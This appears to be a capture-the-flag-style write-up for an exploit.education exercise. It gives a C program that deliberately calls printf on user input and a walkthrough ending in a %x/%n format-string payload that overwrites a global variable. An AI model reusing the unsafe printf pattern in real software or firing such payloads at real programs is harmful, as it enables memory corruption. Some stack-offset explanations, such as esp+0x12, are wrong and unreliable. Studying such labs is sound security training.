# Source code

```C
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```

# Walkthrough

We recall that `strncpy` copies a string without inserting formatting. That is,
if we input `%100s` then that's the literal string that will be copied into `str`.
However, when `printf` runs on `str`, it can handle formatting. However, the
problem is, of course, that no other arguments are supplied to `printf`.

When running on a 32-bit system, the argument are pushed on the stack in reversed
order. So, if I call `printf` as

```
printf("%x");
```

then `printf` will run as

```
printf("%x", num);
```

where `num` is at `esp` and the address of `"%x"` is at `esp+0x4`. If I `printf`
as

```
printf("%x %x %x %x");
```

then it will run as

```
printf("%x %x %x %x", num1, num2, num3, num4);
```

where `num4` is at `esp`, `num3` is at `esp+0x4`, `num2` is at `esp+0x8` and
`num1` is at `esp+0x12`, and the `"%x %x %x %x"` is at `esp+0x16`.

Now, to write things with `printf`, the key is to use `%n`. If I write

```
printf("%x %x %x %x %n", num1, num2, num3, num4, num5);
```

the length of `%x %x %x %x ` will be written to `num5`. Similarly, if I write


```
printf("%x %x %x %x %n");
```

the length of `%x %x %x %x ` will be written whatever is at the top of the stack.

So we make sure to control what is at the top of the stack. When we write

```
printf("AAAA%x %x %x %x %x %x %x %x %x %x %x %x");
```

we find `0x41414141` at the end of the output. In other words, we have `0x41414141`
at the top of the stack. If we append `%n`, then we will attempt to write to
`0x41414141`. So we change `0x41414141` to the address of `changeme`. In `gdb`
we find the address with `p &changeme` and find that it is at

```
\x68\x98\x04\x08
```

in little endian. So we change the format string to

```
\x68\x98\x04\x08%x %x %x %x %x %x %x %x %x %x %x %x %n
```
